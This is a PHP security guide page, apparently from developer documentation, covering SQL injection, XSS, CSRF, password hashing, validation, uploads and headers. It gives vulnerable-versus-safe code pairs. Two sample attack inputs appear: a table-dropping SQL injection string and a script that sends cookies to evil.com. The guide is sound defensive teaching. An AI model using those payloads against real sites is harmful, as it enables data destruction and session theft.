---
title: "Security"
weight: 14
---

# Security

PHP powers 75% of the web — making it the most targeted server-side language. This section covers the security vulnerabilities that affect PHP applications and the practices that prevent them.

---

## SQL Injection

The most critical web vulnerability. User input is interpolated into SQL, allowing attackers to execute arbitrary queries.

```php
// VULNERABLE — never do this
$query = "SELECT * FROM users WHERE email = '$email'";
// Input: ' OR 1=1; DROP TABLE users; --

// SAFE — parameterised queries (PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = :email");
$stmt->execute(['email' => $email]);
$user = $stmt->fetch();

// SAFE — prepared statements (MySQLi)
$stmt = $mysqli->prepare("SELECT * FROM users WHERE email = ?");
$stmt->bind_param("s", $email);
$stmt->execute();
```

**Rule:** Never concatenate user input into SQL. Always use prepared statements.

---

## Cross-Site Scripting (XSS)

User input rendered as HTML allows attackers to inject JavaScript.

```php
// VULNERABLE — raw output
echo "<p>Welcome, $username</p>";
// Input: <script>document.location='https://evil.com/?c='+document.cookie</script>

// SAFE — escape output
echo "<p>Welcome, " . htmlspecialchars($username, ENT_QUOTES, 'UTF-8') . "</p>";

// In Blade (Laravel)
{{ $username }}  // auto-escaped
{!! $rawHtml !!}  // NOT escaped — use only for trusted content
```

| Context | Escaping Function |
|---------|------------------|
| HTML body | `htmlspecialchars($str, ENT_QUOTES, 'UTF-8')` |
| HTML attribute | Same + quote the attribute value |
| JavaScript | `json_encode($str)` (for embedding in JS) |
| URL parameter | `urlencode($str)` |
| CSS | Avoid — use allowlists |

---

## Cross-Site Request Forgery (CSRF)

An attacker tricks a logged-in user's browser into making requests to your application.

### Prevention: CSRF Tokens

```php
// Generate token
session_start();
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// Include in form
<input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">

// Validate on submission
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    http_response_code(403);
    die('Invalid CSRF token');
}

// Laravel handles this automatically
@csrf  // in Blade templates
```

---

## Password Handling

```php
// HASHING — use password_hash (bcrypt by default)
$hash = password_hash($password, PASSWORD_DEFAULT);
// $2y$10$... (bcrypt, cost 10)

// VERIFICATION
if (password_verify($password, $storedHash)) {
    // authenticated
}

// REHASHING — upgrade cost factor transparently
if (password_needs_rehash($storedHash, PASSWORD_DEFAULT)) {
    $newHash = password_hash($password, PASSWORD_DEFAULT);
    // update in database
}
```

**Never** use `md5()`, `sha1()`, or `sha256()` for passwords. They are fast hash functions — attackers can brute-force billions per second. `password_hash` uses bcrypt (intentionally slow).

---

## Input Validation

```php
// Filter functions
$email = filter_var($input, FILTER_VALIDATE_EMAIL);
$url = filter_var($input, FILTER_VALIDATE_URL);
$int = filter_var($input, FILTER_VALIDATE_INT);

if ($email === false) {
    throw new InvalidArgumentException('Invalid email');
}

// Type-safe with PHP 8
function createUser(string $name, string $email, int $age): User {
    if (strlen($name) < 2 || strlen($name) > 100) {
        throw new ValidationException('Name must be 2-100 characters');
    }
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        throw new ValidationException('Invalid email');
    }
    // ...
}

// Laravel validation
$validated = $request->validate([
    'name' => 'required|string|min:2|max:100',
    'email' => 'required|email|unique:users',
    'age' => 'nullable|integer|min:0|max:150',
]);
```

---

## File Upload Security

```php
// Validate file type (never trust the extension alone)
$allowed = ['image/jpeg', 'image/png', 'image/gif'];
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mimeType = $finfo->file($_FILES['upload']['tmp_name']);

if (!in_array($mimeType, $allowed)) {
    die('Invalid file type');
}

// Generate random filename (prevent path traversal)
$ext = pathinfo($_FILES['upload']['name'], PATHINFO_EXTENSION);
$filename = bin2hex(random_bytes(16)) . '.' . $ext;

// Store outside web root
move_uploaded_file($_FILES['upload']['tmp_name'], '/var/uploads/' . $filename);
```

---

## Dependency Auditing

```bash
# Check for known vulnerabilities in dependencies
composer audit

# Keep dependencies updated
composer update --with-all-dependencies

# Use Roave Security Advisories to block vulnerable packages
composer require --dev roave/security-advisories:dev-latest
```

---

## Security Headers

```php
header('Content-Security-Policy: default-src \'self\'');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
header('Referrer-Policy: strict-origin-when-cross-origin');
header('Permissions-Policy: camera=(), microphone=(), geolocation=()');
```

---

## Key Takeaways

- SQL injection: always use prepared statements. Never concatenate user input into queries.
- XSS: always escape output with `htmlspecialchars()`. Framework templating engines escape by default.
- CSRF: use tokens on every state-changing form. Frameworks handle this automatically.
- Passwords: `password_hash()` + `password_verify()`. Never MD5/SHA for passwords.
- File uploads: validate MIME type (not just extension), generate random filenames, store outside web root.
- Run `composer audit` regularly. Block vulnerable packages with Roave Security Advisories.
